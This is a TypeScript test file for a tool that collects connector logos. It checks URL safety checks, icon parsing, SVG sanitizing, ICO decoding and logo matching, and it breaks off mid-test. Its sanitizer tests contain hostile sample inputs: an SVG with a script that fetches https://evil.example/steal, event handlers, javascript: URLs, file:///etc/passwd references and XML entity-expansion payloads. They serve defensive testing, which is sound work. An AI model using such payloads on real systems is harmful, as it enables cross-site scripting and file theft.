import fs from 'node:fs'
import path from 'node:path'
import sharp from 'sharp'
import { describe, expect, it } from 'vitest'
import type { DirectoryConnector } from '../src/shared/mcp-connectors'
import {
  BACKDROP_DARK,
  BACKDROP_LIGHT,
  TILE_SIZE,
  analyzeRaster,
  baseFileName,
  brandKey,
  brandLabelOf,
  brandNameOf,
  buildBrandIndex,
  buildIndex,
  conventionalIconUrls,
  decodeIco,
  declaredSize,
  glyphColorOn,
  glyphTileSvg,
  imageTypeOfUrl,
  isFetchableUrl,
  isPrivateAddress,
  isSafeSvgAsset,
  looksLikeImageUrl,
  matchSimpleIcon,
  normalizeDomain,
  parseAttributes,
  parseHtmlIcons,
  parseIcoEntries,
  parseManifestIcons,
  relativeLuminance,
  renderIndexModule,
  sanitizeSvg,
  scoreCandidate,
  upgradeFaviconServiceUrl
} from '../scripts/lib/connector-icons-core.mjs'
import { CONNECTOR_ICON_INDEX } from '../src/renderer/src/lib/connector-icon-index'
import {
  CONNECTOR_ICON_BASE,
  brandWords,
  connectorIconFile,
  connectorIconUrl,
  connectorIconView,
  hostCandidates,
  normalizeIconDomain
} from '../src/renderer/src/lib/connector-icons'
import { buildRows } from '../src/renderer/src/lib/connectors'

const ROOT = path.join(__dirname, '..')
const ICONS_DIR = path.join(ROOT, 'src', 'renderer', 'public', 'connector-icons')

/** An RGBA image painted pixel by pixel. */
function rgba(width: number, height: number, paint: (x: number, y: number) => [number, number, number, number]): Buffer {
  const out = Buffer.alloc(width * height * 4)
  for (let y = 0; y < height; y++) for (let x = 0; x < width; x++) out.set(paint(x, y), (y * width + x) * 4)
  return out
}

describe('addresses the collector may visit', () => {
  it('normalizes domains from URLs, hosts and noise', () => {
    expect(normalizeDomain('https://www.GitHub.com/org/repo?x=1')).toBe('github.com')
    expect(normalizeDomain('mcp.example.com:8443/path')).toBe('mcp.example.com')
    expect(normalizeDomain('  Notion.so. ')).toBe('notion.so')
    expect(normalizeDomain('localhost')).toBe('')
    expect(normalizeDomain('not a domain')).toBe('')
    expect(normalizeDomain('')).toBe('')
    expect(normalizeDomain(undefined)).toBe('')
    expect(brandLabelOf('mycase.com')).toBe('mycase')
    expect(brandLabelOf('www.example.co.uk')).toBe('example')
  })

  it('refuses loopback, private, link-local, CGNAT and multicast addresses', () => {
    for (const address of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.0.10', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '::1', '::', 'fc00::1', 'fd12::1', 'fe80::1', 'ff02::1', '::ffff:127.0.0.1', '']) {
      expect(isPrivateAddress(address), address).toBe(true)
    }
    for (const address of ['8.8.8.8', '1.1.1.1', '172.15.0.1', '172.32.0.1', '100.63.0.1', '2606:4700:4700::1111']) {
      expect(isPrivateAddress(address), address).toBe(false)
    }
  })

  it('only fetches public http(s) URLs without credentials', () => {
    expect(isFetchableUrl('https://github.com/')).toBe(true)
    expect(isFetchableUrl('http://example.com/favicon.ico')).toBe(true)
    for (const url of ['file:///etc/passwd', 'ftp://example.com/x', 'javascript:alert(1)', 'https://user:pw@example.com/', 'http://localhost:3000/', 'http://127.0.0.1/', 'http://192.168.0.1/', 'http://[::1]/', 'https://printer.local/', 'https://svc.internal/', 'https://intranet/', 'not a url', '']) {
      expect(isFetchableUrl(url), url).toBe(false)
    }
  })
})

describe('HTML and manifest icons', () => {
  const page = 'https://www.example.com/products/'

  it('reads every icon link, resolves it against the page and ignores everything else', () => {
    const html = `<!doctype html><html><head>
      <!-- <link rel="icon" href="/commented-out.png"> -->
      <link rel="stylesheet" href="/app.css">
      <link rel="ICON" TYPE="image/png" sizes="32x32" href="/f32.png">
      <link rel='shortcut icon' href='favicon.ico'>
      <link rel="apple-touch-icon" sizes="180x180" href="/touch.png">
      <link rel="apple-touch-icon-precomposed" href=//cdn.example.com/pre.png>
      <link rel="icon" type="image/svg+xml" sizes="any" href="/logo.svg">
      <link rel="icon" href="/f32.png">
      <link rel="manifest" href="/site.webmanifest">
      <link rel="mask-icon" href="/pinned.svg">
      <link rel="icon" href="javascript:alert(1)">
      <link rel="icon" href="">
    </head></html>`
    const icons = parseHtmlIcons(html, page)
    expect(icons.map((icon) => icon.url)).toEqual([
      'https://www.example.com/f32.png',
      'https://www.example.com/products/favicon.ico',
      'https://www.example.com/touch.png',
      'https://cdn.example.com/pre.png',
      'https://www.example.com/logo.svg',
      'https://www.example.com/site.webmanifest'
    ])
    expect(icons[0]).toMatchObject({ kind: 'icon', size: 32, type: 'image/png' })
    expect(icons[2]).toMatchObject({ kind: 'apple', size: 180 })
    expect(icons[4]).toMatchObject({ kind: 'icon', type: 'image/svg+xml', size: 0 })
    expect(icons[5].kind).toBe('manifest')
  })

  it('honours <base href> and accepts small inline image data URIs only', () => {
    const png = 'data:image/png;base64,iVBORw0KGgo='
    const icons = parseHtmlIcons(`<base href="https://static.example.org/assets/"><link rel="icon" href="a.png"><link rel="icon" href="${png}"><link rel="icon" href="data:text/html;base64,PHNjcmlwdD4=">`, page)
    expect(icons.map((icon) => icon.url)).toEqual(['https://static.example.org/assets/a.png', png])
  })

  it('reads attributes in any quoting style and the largest declared size', () => {
    expect(parseAttributes(`<link REL="icon" href='/x.png' sizes=48x48 data-x>`)).toMatchObject({ rel: 'icon', href: '/x.png', sizes: '48x48', 'data-x': '' })
    expect(declaredSize('16x16 32x32 192x192')).toBe(192)
    expect(declaredSize('any')).toBe(0)
    expect(declaredSize(undefined)).toBe(0)
  })

  it('reads web manifest icons, skips monochrome ones and flags maskable ones', () => {
    const manifest = {
      icons: [
        { src: 'icon-192.png', sizes: '192x192', type: 'image/png' },
        { src: '/maskable.png', sizes: '512x512', purpose: 'maskable' },
        { src: '/mono.png', sizes: '96x96', purpose: 'monochrome' },
        { src: 'https://cdn.example.net/big.png', sizes: '512x512', purpose: 'any maskable' },
        { sizes: '48x48' },
        null
      ]
    }
    const icons = parseManifestIcons(manifest, 'https://example.com/static/site.webmanifest')
    expect(icons.map((icon) => icon.url)).toEqual(['https://example.com/static/icon-192.png', 'https://example.com/maskable.png', 'https://cdn.example.net/big.png'])
    expect(icons.map((icon) => Boolean(icon.maskable))).toEqual([false, true, false])
    expect(parseManifestIcons('{not json', 'https://example.com/m.json')).toEqual([])
    expect(parseManifestIcons({ icons: 'nope' }, 'https://example.com/m.json')).toEqual([])
  })

  it('knows image URLs and the conventional icon addresses', () => {
    expect(imageTypeOfUrl('https://x.com/a/logo.SVG?v=2')).toBe('image/svg+xml')
    expect(imageTypeOfUrl('https://x.com/a')).toBe('')
    // The favicon services of Google answer with an image although the address has no extension.
    expect(looksLikeImageUrl('https://www.google.com/s2/favicons?domain=x.com&sz=64')).toBe(true)
    expect(looksLikeImageUrl('https://t0.gstatic.com/faviconV2?client=SOCIAL&url=https://x.com')).toBe(true)
    expect(looksLikeImageUrl('https://www.google.com/search?q=x')).toBe(false)
    expect(looksLikeImageUrl('https://x.com/icon.png')).toBe(true)
    expect(looksLikeImageUrl('https://x.com/')).toBe(false)
    expect(looksLikeImageUrl('https://www.agri.so/favicon')).toBe(true)
    expect(conventionalIconUrls('https://example.com/').map((icon) => icon.url)).toContain('https://example.com/apple-touch-icon.png')
    expect(conventionalIconUrls('nope')).toEqual([])
    expect(upgradeFaviconServiceUrl('https://www.google.com/s2/favicons?domain=cloudbees.com&sz=64')).toBe('https://www.google.com/s2/favicons?domain=cloudbees.com&sz=256')
    expect(upgradeFaviconServiceUrl('https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&url=https://mail.google.com&size=64')).toContain('size=128')
    expect(upgradeFaviconServiceUrl('https://example.com/logo.png')).toBe('https://example.com/logo.png')
  })
})

describe('SVG from third parties', () => {
  const evil = `<?xml version="1.0"?>
<!-- tracker -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10" onload="alert(1)">
  <script>fetch('https://evil.example/steal')</script>
  <foreignObject><div xmlns="http://www.w3.org/1999/xhtml">hi</div></foreignObject>
  <style>@import url(https://evil.example/x.css); .a { fill: url(https://evil.example/p.svg#x); } .b { fill: url(#grad); }</style>
  <linearGradient id="grad"><stop offset="0" stop-color="red"/></linearGradient>
  <a xlink:href="https://evil.example/"><rect class="b" width="5" height="5" onclick="x()" /></a>
  <image href="https://evil.example/pixel.png" width="1" height="1"/>
  <image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>
  <use xlink:href="#shape"/><use href="file:///etc/passwd"/>
  <animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onclick" to="x()"/>
  <circle id="shape" cx="5" cy="5" r="2" fill="url('http://evil.example/c')"/>
</svg>`

  it('drops scripts, foreignObject, handlers, external references, imports and animations', () => {
    const clean = sanitizeSvg(evil) as string
    expect(clean).toBeTruthy()
    for (const forbidden of [/<script/i, /foreignObject/i, /\sonload/i, /\sonclick/i, /evil\.example/i, /@import/i, /<animate/i, /<set\b/i, /javascript:/i, /file:\/\//i, /<\?xml-stylesheet/i]) {
      expect(clean, String(forbidden)).not.toMatch(forbidden)
    }
    // The drawing survives: shapes, the gradient reference to an id in the same file and the inline PNG.
    expect(clean).toContain('<rect')
    expect(clean).toContain('url(#grad)')
    expect(clean).toContain('xlink:href="#shape"')
    expect(clean).toContain('data:image/png;base64,iVBORw0KGgo=')
    expect(isSafeSvgAsset(clean)).toBe(true)
  })

  it('refuses entity declarations, huge files and things that are not SVG', () => {
    expect(sanitizeSvg('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;">]><svg xmlns="http://www.w3.org/2000/svg">&b;</svg>')).toBeNull()
    expect(sanitizeSvg('<!ENTITY x SYSTEM "file:///etc/passwd"><svg></svg>')).toBeNull()
    expect(sanitizeSvg(`<svg>${'a'.repeat(900_000)}</svg>`)).toBeNull()
    expect(sanitizeSvg('<html><body>not svg</body></html>')).toBeNull()
    expect(sanitizeSvg('')).toBeNull()
  })

  it('recognizes what is safe to ship as an <img>', () => {
    expect(isSafeSvgAsset('<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1"/></svg>')).toBe(true)
    for (const bad of ['<svg><script>1</script></svg>', '<svg onload="x()"></svg>', '<svg><a href="https://x.example"></a></svg>', '<svg><rect fill="url(https://x.example/a)"/></svg>', '<svg><style>@import "x.css"</style></svg>', '<!DOCTYPE svg><svg></svg>', 'text']) {
      expect(isSafeSvgAsset(bad), bad).toBe(false)
    }
  })
})

describe('the .ico files', () => {
  const entryHeader = (width: number, height: number, data: Buffer, offset: number, bitCount = 32): Buffer => {
    const entry = Buffer.alloc(16)
    entry[0] = width >= 256 ? 0 : width
    entry[1] = height >= 256 ? 0 : height
    entry.writeUInt16LE(1, 4)
    entry.writeUInt16LE(bitCount, 6)
    entry.writeUInt32LE(data.length, 8)
    entry.writeUInt32LE(offset, 12)
    return entry
  }
  function ico(images: Array<{ width: number; height: number; data: Buffer; bitCount?: number }>): Buffer {
    const header = Buffer.alloc(6)
    header.writeUInt16LE(1, 2)
    header.writeUInt16LE(images.length, 4)
    let offset = 6 + images.length * 16
    const entries = images.map((image) => {
      const entry = entryHeader(image.width, image.height, image.data, offset, image.bitCount)
      offset += image.data.length
      return entry
    })
    return Buffer.concat([header, ...entries, ...images.map((image) => image.data)])
  }
  function dib(width: number, height: number, bpp: number, body: Buffer, palette: Buffer = Buffer.alloc(0), colorsUsed = 0): Buffer {
    const header = Buffer.alloc(40)
    header.writeUInt32LE(40, 0)
    header.writeInt32LE(width, 4)
    header.writeInt32LE(height * 2, 8)
    header.writeUInt16LE(1, 12)
    header.writeUInt16LE(bpp, 14)
    header.writeUInt32LE(colorsUsed, 32)
    return Buffer.concat([header, palette, body])
  }

  it('picks the largest image and passes a PNG entry straight through', async () => {
    const png = await sharp({ create: { width: 64, height: 64, channels: 4, background: '#ff0000' } }).png().toBuffer()
    const small = dib(2, 2, 32, Buffer.alloc(2 * 2 * 4 + 8))
    const decoded = decodeIco(ico([{ width: 2, height: 2, data: small }, { width: 64, height: 64, data: png }]))
    expect(decoded.format).toBe('png')
    expect((await sharp(decoded.data).metadata()).width).toBe(64)
    expect(parseIcoEntries(ico([{ width: 256, height: 256, data: png }]))[0]).toMatchObject({ width: 256, height: 256 })
  })

  it('decodes a 32-bit BMP entry, bottom-up, keeping its alpha', () => {
    // Rows are stored bottom-up: first the bottom row (blue, white 50%), then the top row (red, green).
    const bottomUp = Buffer.from([255, 0, 0, 255, 255, 255, 255, 128, 0, 0, 255, 255, 0, 255, 0, 255])
    const decoded = decodeIco(ico([{ width: 2, height: 2, data: dib(2, 2, 32, Buffer.concat([bottomUp, Buffer.alloc(8)])) }]))
    expect(decoded).toMatchObject({ format: 'rgba', width: 2, height: 2 })
    expect([...decoded.data]).toEqual([255, 0, 0, 255, 0, 255, 0, 255, 0, 0, 255, 255, 255, 255, 255, 128])
  })

  it('decodes a 24-bit entry using the AND mask for transparency, and an 8-bit entry with a palette', () => {
    // 2x2, 24 bits: rows of 6 bytes padded to 8. Top row: red, green. Bottom row: blue, white. Mask: top-left transparent.
    const row = (...pixels: number[][]): Buffer => Buffer.concat([Buffer.from(pixels.flatMap(([r, g, b]) => [b, g, r])), Buffer.alloc(2)])
    const xor = Buffer.concat([row([0, 0, 255], [255, 255, 255]), row([255, 0, 0], [0, 255, 0])])
    const mask = Buffer.concat([Buffer.from([0x00, 0, 0, 0]), Buffer.from([0x80, 0, 0, 0])])
    const bmp24 = decodeIco(ico([{ width: 2, height: 2, data: dib(2, 2, 24, Buffer.concat([xor, mask]), undefined, 0), bitCount: 24 }]))
    expect([...bmp24.data]).toEqual([255, 0, 0, 0, 0, 255, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255])

    const palette = Buffer.from([0, 0, 255, 0, 255, 0, 0, 0]) // BGRA: red, blue
    const indexes = Buffer.from([0b01100000 /* red? no: 0,1 */, 0, 0, 0])
    const bmp8 = decodeIco(ico([{ width: 2, height: 1, data: dib(2, 1, 8, Buffer.concat([Buffer.from([0, 1, 0, 0]), Buffer.alloc(4)]), palette, 2), bitCount: 8 }]))
    void indexes
    expect([...bmp8.data]).toEqual([255, 0, 0, 255, 0, 0, 255, 255])
  })

  it('throws on files that are not a valid .ico', () => {
    expect(() => decodeIco(Buffer.from('GIF89a not an ico at all, long enough to pass the length check'))).toThrow()
    expect(() => decodeIco(Buffer.alloc(10))).toThrow()
    const liar = ico([{ width: 8, height: 8, data: Buffer.alloc(20) }])
    expect(() => decodeIco(liar)).toThrow()
    const header = Buffer.alloc(22)
    header.writeUInt16LE(1, 2)
    header.writeUInt16LE(200, 4)
    expect(() => parseIcoEntries(header)).toThrow()
  })
})

describe('colours and the brand tile', () => {
  it('computes the WCAG relative luminance', () => {
    expect(relativeLuminance('#000000')).toBe(0)
    expect(relativeLuminance('#ffffff')).toBeCloseTo(1, 5)
    expect(relativeLuminance('#777777')).toBeGreaterThan(relativeLuminance('#333333'))
    expect(() => relativeLuminance('red')).toThrow()
  })

  it('draws the glyph in white, and in near-black only on very light brand colours', () => {
    expect(glyphColorOn('#181717')).toBe('#ffffff') // GitHub
    expect(glyphColorOn('#4285f4')).toBe('#ffffff') // Google blue
    expect(glyphColorOn('#25d366')).toBe('#ffffff') // WhatsApp green: white, as the brand does
    expect(glyphColorOn('#ff9900')).toBe('#ffffff') // AWS orange
    expect(glyphColorOn('#fffc00')).toBe('#111111') // Snapchat yellow
    expect(glyphColorOn('#ffe01b')).toBe('#111111') // Mailchimp yellow
    expect(glyphColorOn('#9dff8d')).toBe('#111111') // light green
    expect(glyphColorOn('#ffffff')).toBe('#111111')
    expect(() => glyphColorOn('verde')).toThrow()
  })

  it('writes a square tile from a validated path and colour, and nothing else', () => {
    const svg = glyphTileSvg({ path: 'M12 .297c-6.63 0-12 5.373-12 12z', hex: '#25D366' })
    expect(svg).toContain(`viewBox="0 0 ${TILE_SIZE} ${TILE_SIZE}"`)
    expect(svg).toContain('fill="#25d366"')
    expect(svg).toContain('d="M12 .297c-6.63 0-12 5.373-12 12z"')
    expect(isSafeSvgAsset(svg)).toBe(true)
    for (const bad of [{ path: 'M0 0"/><script>1</script>', hex: '#ffffff' }, { path: '', hex: '#ffffff' }, { path: 'M0 0', hex: 'rgb(0,0,0)' }, { path: 'M0 0', hex: '#ffff' }, { path: 'url(#x)', hex: '#ffffff' }]) {
      expect(() => glyphTileSvg(bad), JSON.stringify(bad)).toThrow()
    }
  })
})

describe('matching a connector to a simple-icons brand', () => {
  const icons = [
    { title: 'GitHub', slug: 'github', hex: '181717', source: 'https://github.com/logos' },
    { title: 'Terraform', slug: 'terraform', hex: '844FBA', source: 'https://www.hashicorp.com/brand' },
    { title: 'OpenTofu', slug: 'opentofu', hex: 'FFDA18', source: 'https://terraform.io/brand', aliases: { aka: ['Terraform'] } },
    { title: 'Notion', slug: 'notion', hex: '000000', source: 'https://www.notion.so/press' },
    { title: 'Booking.com', slug: 'bookingdotcom', hex: '003B95', source: 'https://www.booking.com/' },
    { title: 'Fathom', slug: 'fathom', hex: '9187FF', source: 'https://usefathom.com/brand' }
  ]
  const index = buildBrandIndex(icons)
  const slugOf = (input: { name: string; id?: string; domain?: string }): string | undefined => matchSimpleIcon(input, index)?.icon.slug

  it('trusts a match only when name and domain agree', () => {
    expect(matchSimpleIcon({ name: 'Notion (oficial)', id: 'notion', domain: 'notion.so' }, index)).toMatchObject({ confidence: 'high', icon: { slug: 'notion' } })
    expect(matchSimpleIcon({ name: 'GitHub (oficial)', id: 'github', domain: 'github.com' }, index)).toMatchObject({ confidence: 'high', icon: { slug: 'github' } })
    // Only the name agrees (no domain to confirm it): medium, so the collector asks for a human check.
    expect(matchSimpleIcon({ name: 'Booking.com', id: 'booking-com', domain: undefined }, index)).toMatchObject({ confidence: 'medium', icon: { slug: 'bookingdotcom' } })
  })

  it('prefers the brand the name points to over one that only shares an alias or a host', () => {
    expect(slugOf({ name: 'Terraform', id: 'terraform', domain: 'terraform.io' })).toBe('terraform')
  })

  it('finds nothing for unrelated names, and a domain alone gives only a medium match', () => {
    expect(matchSimpleIcon({ name: 'Zeta Docs', id: 'zeta', domain: 'zeta.example' }, index)).toBeNull()
    // The domain label is the brand's, but the product name is not and the icon comes from another host: ask a human.
    expect(matchSimpleIcon({ name: 'Infra Tool', id: 'infra', domain: 'terraform.io' }, index)?.confidence).toBe('medium')
    // A brand known only by an alias never gets "high" on its own.
    const onlyAlias = buildBrandIndex([icons[2]])
    expect(matchSimpleIcon({ name: 'Terraform', id: 'terraform', domain: 'terraform.io' }, onlyAlias)).toMatchObject({ confidence: 'medium', icon: { slug: 'opentofu' } })
    expect(brandKey('Booking.com®')).toBe('bookingcom')
    expect(brandNameOf('Atlassian (Jira + Confluence, oficial)')).toBe('Atlassian')
    expect(brandNameOf('Linear MCP Server™')).toBe('Linear')
  })
})

describe('scoring a logo candidate', () => {
  it('prefers vectors and big bitmaps, then the apple-touch icon, then small icons', () => {
    const svg = scoreCandidate({ source: 'diretorio', vector: true }) as number
    const big = scoreCandidate({ source: 'diretorio', width: 512, height: 512 }) as number
    const touch = scoreCandidate({ source: 'site', width: 180, height: 180, kind: 'apple' }) as number
    const favicon = scoreCandidate({ source: 'site', width: 48, height: 48 }) as number
    const tiny = scoreCandidate({ source: 'site', width: 32, height: 32 }) as number
    expect(svg).toBeGreaterThan(big)
    expect(big).toBeGreaterThan(touch - 5)
    expect(touch).toBeGreaterThan(favicon)
    expect(favicon).toBeGreaterThan(tiny)
    expect(scoreCandidate({ source: 'servico-de-favicons', width: 128, height: 128 }) as number).toBeLessThan(touch)
  })

  it('refuses images under 32 px and sources it does not know, and penalizes wide wordmarks and maskable icons', () => {
    expect(scoreCandidate({ source: 'site', width: 31, height: 31 })).toBeNull()
    expect(scoreCandidate({ source: 'site', width: 0, height: 0 })).toBeNull()
    expect(scoreCandidate({ source: 'inventada', width: 512, height: 512 })).toBeNull()
    const square = scoreCandidate({ source: 'diretorio', width: 256, height: 256 }) as number
    const wide = scoreCandidate({ source: 'diretorio', width: 256, height: 64 }) as number
    expect(wide).toBeLessThan(square - 20)
    expect(scoreCandidate({ source: 'site', width: 512, height: 512, maskable: true }) as number).toBeLessThan(scoreCandidate({ source: 'site', width: 512, height: 512 }) as number)
    expect(scoreCandidate({ source: 'simple-icons' })).toBe(70)
  })
})

describe('deciding how to frame a bitmap', () => {
  it('lets a full-colour square fill the whole tile', () => {
    const plan = analyzeRaster(rgba(64, 64, (x) => [30, 90 + x, 200, 255]), 64, 64)
    expect(plan).toMatchObject({ mode: 'bleed', reason: 'opaca' })
  })

  it('recentres a figure on a transparent background on a light tile', () => {
    const image = rgba(100, 100, (x, y) => (x >= 30 && x < 70 && y >= 40 && y < 60 ? [20, 20, 20, 255] : [0, 0, 0, 0]))
    const plan = analyzeRaster(image, 100, 100)
    expect(plan).toMatchObject({ mode: 'logo', reason: 'transparente', backdrop: BACKDROP_LIGHT, crop: { left: 30, top: 40, width: 40, height: 20 } })
  })

  it('puts a white logo on a dark tile, so it does not vanish', () => {
    const image = rgba(100, 100, (x, y) => (x >= 20 && x < 80 && y >= 20 && y < 80 ? [255, 255, 255, 255] : [0, 0, 0, 0]))
    expect(analyzeRaster(image, 100, 100)).toMatchObject({ mode: 'logo', backdrop: BACKDROP_DARK })
  })

  it('keeps an app icon with rounded transparent corners as a full-bleed tile', () => {
    const size = 100
    const image = rgba(size, size, (x, y) => {
      const dx = Math.min(x, size - 1 - x)
      const dy = Math.min(y, size - 1 - y)
      const corner = dx < 14 && dy < 14 && (14 - dx) ** 2 + (14 - dy) ** 2 > 14 ** 2
      return corner ? [0, 0, 0, 0] : [40, 90, 220, 255]
    })
    expect(analyzeRaster(image, size, size)).toMatchObject({ mode: 'bleed', reason: 'cantos-arredondados' })
  })

  it('crops a small mark floating on a plain white or black canvas', () => {
    const onWhite = rgba(120, 120, (x, y) => (x >= 40 && x < 80 && y >= 50 && y < 70 ? [200, 30, 30, 255] : [255, 255, 255, 255]))
    expect(analyzeRaster(onWhite, 120, 120)).toMatchObject({ mode: 'logo', reason: 'fundo-liso', backdrop: '#ffffff', crop: { left: 40, top: 50, width: 40, height: 20 } })
    const onBlack = rgba(120, 120, (x, y) => (x >= 40 && x < 80 && y >= 40 && y < 80 ? [240, 240, 240, 255] : [0, 0, 0, 255]))
    expect(analyzeRaster(onBlack, 120, 120)).toMatchObject({ mode: 'logo', backdrop: '#000000' })
  })

  it('does not reframe an icon whose coloured background is the design', () => {
    const image = rgba(100, 100, (x, y) => (x >= 35 && x < 65 && y >= 35 && y < 65 ? [255, 255, 255, 255] : [20, 80, 200, 255]))
    expect(analyzeRaster(image, 100, 100).mode).toBe('bleed')
  })

  it('refuses an image with nothing visible and a buffer that is too short', () => {
    expect(() => analyzeRaster(rgba(10, 10, () => [0, 0, 0, 0]), 10, 10)).toThrow()
    expect(() => analyzeRaster(Buffer.alloc(8), 10, 10)).toThrow()
  })
})

describe('file names and the generated index', () => {
  it('names a file after the connector id and avoids reserved Windows names', () => {
    expect(baseFileName('github')).toBe('github')
    expect(baseFileName('Zoho CRM!')).toBe('zoho-crm')
    expect(baseFileName('con')).toBe('con-logo')
    expect(baseFileName('NUL')).toBe('nul-logo')
    expect(baseFileName('com1')).toBe('com1-logo')
    expect(() => baseFileName('!!!')).toThrow()
  })

  it('maps ids, unambiguous domains and brand words, with stable key order', () => {
    const index = buildIndex({
      entries: [
        { id: 'zoho-crm', domain: 'zoho.com', file: 'zoho-crm.webp' },
        { id: 'zoho-books', domain: 'zoho.com', file: 'zoho-crm.webp' },
        { id: 'github', domain: 'github.com', file: 'github.svg' },
        { id: 'serena', domain: 'github.com', file: 'serena.webp' },
        { id: 'biorxiv', domain: 'claude.com', file: 'biorxiv.webp' },
        { id: 'pubmed', domain: 'claude.com', file: 'pubmed.webp' },
        { id: 'sem-logo', domain: 'sem.example' }
      ],
      brandFiles: { whatsapp: 'brand-whatsapp.svg', appwrite: 'brand-appwrite.svg' }
    })
    expect(index.byId).toEqual({ biorxiv: 'biorxiv.webp', github: 'github.svg', pubmed: 'pubmed.webp', serena: 'serena.webp', 'zoho-books': 'zoho-crm.webp', 'zoho-crm': 'zoho-crm.webp' })
    // zoho.com: every connector shares one file. github.com: the connector named like the domain owns it.
    // claude.com: two different files and none named "claude", so no domain entry (the id lookup still works).
    expect(index.byDomain).toEqual({ 'github.com': 'github.svg', 'zoho.com': 'zoho-crm.webp' })
    expect(Object.keys(index.byBrand)).toEqual(['appwrite', 'whatsapp'])
  })

  it('renders a TypeScript module that holds exactly the index', () => {
    const index = { byId: { a: 'a.webp' }, byDomain: { 'a.com': 'a.webp' }, byBrand: { a: 'a.webp' } }
    const source = renderIndexModule(index)
    expect(source).toContain('export const CONNECTOR_ICON_INDEX: ConnectorIconIndex =')
    const literal = source.slice(source.indexOf('= {') + 2).trim()
    expect(JSON.parse(literal)).toEqual(index)
  })
})

describe('which logo a connector gets', () => {
  const index = {
    byId: { github: 'github.svg', 'atlassian-token': 'atlassian.webp', constructor: 'wrong.webp' },
    byDomain: { 'linear.app': 'linear.webp', 'mercadopago.com': 'brand-mercadopago.svg' },
    byBrand: { whatsapp: 'brand-whatsapp.svg', appwrite: 'brand-appwrite.svg', googledrive: 'brand-googledrive.svg', mercadopago: 'brand-mercadopago.svg', git: 'brand-git.svg' }
  }
  const target = (patch: { id: string; name?: string; custom?: boolean; endpoint?: string; iconDomain?: string }) => ({
    id: patch.id,
    name: patch.name ?? patch.id,
    custom: patch.custom,
    endpoint: patch.endpoint,
    entry: patch.custom ? undefined : { iconDomain: patch.iconDomain }
  })

  it('uses the id first, then the domain of the directory entry', () => {
    expect(connectorIconFile(target({ id: 'github' }), index)).toBe('github.svg')
    expect(connectorIconFile(target({ id: 'novo-id-do-linear', iconDomain: 'https://www.Linear.app/' }), index)).toBe('linear.webp')
    expect(connectorIconFile(target({ id: 'desconhecido', iconDomain: 'nada.example' }), index)).toBeNull()
  })

  it('does not give a directory entry the logo of a brand word in its name', () => {
    expect(connectorIconFile(target({ id: 'git-stats-por-fulano', name: 'Git Stats' }), index)).toBeNull()
  })

  it('gives a connector added by hand the logo of the service its endpoint or name points to', () => {
    expect(connectorIconFile(target({ id: 'mercadopago', custom: true, endpoint: 'https://mcp.mercadopago.com/mcp' }), index)).toBe('brand-mercadopago.svg')
    expect(connectorIconFile(target({ id: 'meu-pagamento', custom: true, endpoint: 'https://api.linear.app/sse' }), index)).toBe('linear.webp')
    expect(connectorIconFile(target({ id: 'whatsapp', custom: true }), index)).toBe('brand-whatsapp.svg')
    for (const name of ['appwrite-api', 'appwrite-docs', 'appwrite-cli-mcp', 'Appwrite']) {
      expect(connectorIconFile(target({ id: name, name, custom: true }), index), name).toBe('brand-appwrite.svg')
    }
    expect(connectorIconFile(target({ id: 'Google Drive', name: 'Google Drive', custom: true }), index)).toBe('brand-googledrive.svg')
    expect(connectorIconFile(target({ id: 'mercado-pago', name: 'Mercado-Pago (teste)', custom: true }), index)).toBe('brand-mercadopago.svg')
    expect(connectorIconFile(target({ id: 'git-helper', custom: true }), index)).toBe('brand-git.svg')
  })

  it('leaves the initials for connectors with no obvious brand', () => {
    for (const id of ['affinitas', 'bridge_gpt', 'figcraft', 'rea', 'servidor-stdio-falso', 'pedidos-falso', 'x', '']) {
      expect(connectorIconFile(target({ id, custom: true, endpoint: id === 'pedidos-falso' ? 'http://127.0.0.1:9371/mcp' : undefined }), index), id).toBeNull()
    }
    expect(connectorIconUrl(target({ id: 'affinitas', custom: true }), index)).toBeNull()
  })

  it('falls back to the initials when there is no logo or the image failed, and retries a different image', () => {
    const withLogo = target({ id: 'github' })
    expect(connectorIconView(withLogo, null, index)).toEqual({ kind: 'image', src: 'connector-icons/github.svg' })
    // This very image failed to load: initials.
    expect(connectorIconView(withLogo, 'connector-icons/github.svg', index)).toEqual({ kind: 'initials' })
    // The failure was of an image this row no longer uses (the row was recycled for another connector): try the new one.
    expect(connectorIconView(withLogo, 'connector-icons/outro.webp', index)).toEqual({ kind: 'image', src: 'connector-icons/github.svg' })
    // No logo at all: initials, whatever failed before.
    expect(connectorIconView(target({ id: 'affinitas', custom: true }), null, index)).toEqual({ kind: 'initials' })
    expect(connectorIconView(target({ id: 'affinitas', custom: true }), 'connector-icons/x.svg', index)).toEqual({ kind: 'initials' })
  })

  it('never reads inherited properties as if they were logos', () => {
    for (const id of ['__proto__', 'toString', 'hasOwnProperty', 'valueOf']) {
      expect(connectorIconFile(target({ id, custom: true }), index), id).toBeNull()
    }
    // "constructor" IS an own key of this test index, so it is found; the real index does not use such ids.
    expect(connectorIconFile(target({ id: 'constructor' }), index)).toBe('wrong.webp')
  })

  it('builds a relative URL inside connector-icons/', () => {
    expect(connectorIconUrl(target({ id: 'github' }), index)).toBe(`${CONNECTOR_ICON_BASE}github.svg`)
    expect(CONNECTOR_ICON_BASE).toBe('connector-icons/')
    expect(connectorIconUrl(target({ id: 'github' }), { byId: { github: 'a b.svg' }, byDomain: {}, byBrand: {} })).toBe('connector-icons/a%20b.svg')
  })

  it('reads domains, host candidates and brand words', () => {
    expect(normalizeIconDomain('HTTPS://WWW.Notion.so:443/x')).toBe('notion.so')
    expect(normalizeIconDomain('nao-e-dominio')).toBe('')
    expect(hostCandidates('https://mcp.api.example.com/mcp')).toEqual(['mcp.api.example.com', 'api.example.com', 'example.com'])
    expect(hostCandidates('https://example.com/mcp')).toEqual(['example.com'])
    expect(hostCandidates(undefined)).toEqual([])
    expect(brandWords('Mercado-Pago (teste)')).toEqual(['mercadopagoteste', 'mercado', 'pago', 'teste', 'mercadopago', 'pagoteste'])
